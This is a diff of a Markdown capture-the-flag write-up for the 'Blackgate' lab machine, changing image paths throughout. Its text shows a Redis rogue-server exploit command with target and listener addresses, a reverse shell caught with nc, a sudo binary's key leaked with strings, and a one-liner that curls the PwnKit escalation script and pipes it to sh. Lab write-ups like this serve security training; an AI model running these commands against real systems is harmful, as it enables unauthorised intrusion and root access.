@@ -37,33 +37,33 @@ _Redis is an open source (BSD licensed), in-memory data structure store, used as
 ## Gaining a Foothold
 
 ### Following Hacktrick “Redis RCE” section,download the exploit below:
-![](Blackgate1.png)
+![](Images/Blackgate1.png)
 https://github.com/n0b0dyCN/redis-rogue-server
-![](Blackgate2.png)
-![](Blackgate3.png)
+![](Images/Blackgate2.png)
+![](Images/Blackgate3.png)
 **Use the exploit in below mentioned manner only otherwise it will give continuous errors.**
 ```sh
  python3 redis-rogue-server.py --rhost 192.168.165.176 --lhost 192.168.45.240
 ```
 
-![](Blackgate4.png)
+![](Images/Blackgate4.png)
 Before entering reverse server address and port, we started nc and got local flag.
-![](Blackgate5.png)
+![](Images/Blackgate5.png)
 
 ### Privilege Escalation
 #### Method 1
 
 Now in the user’s directory there’s a note.txt file
-![](Blackgate6.png)
+![](Images/Blackgate6.png)
 We checked for sudo permissions.
-![](Blackgate7.png)
+![](Images/Blackgate7.png)
 
 So lets run it and see what happens. But it asks for authorization key
-![](Blackgate8.png)
+![](Images/Blackgate8.png)
 Running strings on the binary leaks the authorization key
-![](Blackgate9.png)
+![](Images/Blackgate9.png)
 Now lets rerun the binary since we have the key now.
-![](Blackgate10.png)
+![](Images/Blackgate10.png)
 So we can keep on scrolling down
 
 Now there are two ways I got around getting root
@@ -71,19 +71,19 @@ Now there are two ways I got around getting root
 The first one is likely unintended anyways lets see it
 What i did next was to try call /bin/bash
 `/bin/bash`
-![](Blackgate11.png)
+![](Images/Blackgate11.png)
 
 #### Method 2
 When we ran linpeas, we saw kernel vulnerabilities that linpeas found.
-![](Blackgate12.png)
+![](Images/Blackgate12.png)
 https://github.com/ly4k/PwnKit?source=post_page-----49920d4188de---------------------------------------
 
-![](Blackgate13.png)
+![](Images/Blackgate13.png)
 ```sh
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
-![](Blackgate14.png)
+![](Images/Blackgate14.png)
 
 Blogs we followed:
 https://medium.com/@huwanyu94/proving-grounds-practice-blackgate-walkthrough-9ec512acd0de
